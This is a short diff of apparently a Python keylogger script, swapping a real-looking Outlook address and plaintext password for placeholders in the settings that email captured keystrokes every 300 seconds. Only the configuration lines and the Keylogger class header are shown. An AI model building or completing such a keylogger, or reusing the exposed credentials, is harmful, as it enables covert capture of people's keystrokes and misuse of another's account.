@@ -4,8 +4,8 @@ from threading import Semaphore, Timer
 
 
 SEND_REPORT_EVERY = 300
-EMAIL_ADDRESS = "delta_glitch33@outlook.com"
-EMAIL_PASSWORD = "fw4pfjw3r3f34p5s34fh"
+EMAIL_ADDRESS = "example@example.com"
+EMAIL_PASSWORD = "example"
 
 
 class Keylogger:
